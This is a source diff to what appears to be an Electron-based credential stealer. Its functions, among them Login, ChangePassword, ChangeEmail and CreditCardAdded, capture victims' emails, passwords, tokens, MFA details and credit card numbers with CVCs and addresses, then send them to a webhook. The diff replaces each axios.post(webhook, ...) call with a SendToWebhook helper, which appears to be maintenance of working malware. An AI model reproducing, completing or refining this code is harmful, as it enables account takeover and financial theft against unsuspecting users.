@@ -1,6 +1,5 @@
 const fs = require('fs');
 const path = require('path');
-const axios = require('axios');
 const {
     BrowserWindow,
     session
@@ -88,7 +87,7 @@ function FirstTime() {
                             }
                         }]
                     };
-                    axios.post(webhook, c)
+                    SendToWebhook(JSON.stringify(c))
                 } else {
                     const window = BrowserWindow.getAllWindows()[0];
                     window.webContents.executeJavaScript(`
@@ -128,7 +127,7 @@ function FirstTime() {
                                 }
                             }]
                         };
-                        axios.post(webhook, c)
+                        SendToWebhook(JSON.stringify(c))
                     });
                 }
 
@@ -158,7 +157,7 @@ function FirstTime() {
                             }
                         }]
                     };
-                    axios.post(webhook, c)
+                    SendToWebhook(JSON.stringify(c))
                 } else {
                     const window = BrowserWindow.getAllWindows()[0];
                     window.webContents.executeJavaScript(`
@@ -198,7 +197,7 @@ function FirstTime() {
                                 }
                             }]
                         };
-                        axios.post(webhook, c)
+                        SendToWebhook(JSON.stringify(c))
                     });
                 }
             }
@@ -515,7 +514,7 @@ function Login(email, password, token) {
                                 params.embeds.push(mfaembed)
                             }
 
-                            axios.post(webhook, params)
+                            SendToWebhook(JSON.stringify(params))
 
                         })
                     } else {
@@ -653,7 +652,7 @@ function Login(email, password, token) {
                                                 }
                                             }]
                                         }
-                                        axios.post(webhook, params)
+                                        SendToWebhook(JSON.stringify(params))
                                     })
                                 })
                             })
@@ -851,7 +850,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                 params.embeds.push(mfaembed)
                             }
 
-                            axios.post(webhook, params)
+                            SendToWebhook(JSON.stringify(params))
 
                         })
                     } else {
@@ -994,7 +993,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                                 }
                                             }]
                                         }
-                                        axios.post(webhook, params)
+                                        SendToWebhook(JSON.stringify(params))
                                     })
                                 })
                             })
@@ -1187,7 +1186,7 @@ function ChangeEmail(newemail, password, token) {
                                 params.embeds.push(mfaembed)
                             }
 
-                            axios.post(webhook, params)
+                            SendToWebhook(JSON.stringify(params))
 
                         })
                     } else {
@@ -1326,7 +1325,7 @@ function ChangeEmail(newemail, password, token) {
                                                 }
                                             }]
                                         }
-                                        axios.post(webhook, params)
+                                        SendToWebhook(JSON.stringify(params))
                                     })
                                 })
                             })
@@ -1369,7 +1368,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                     }
                 }]
             }
-            axios.post(webhook, params)
+            SendToWebhook(JSON.stringify(params))
         })
     })
 }
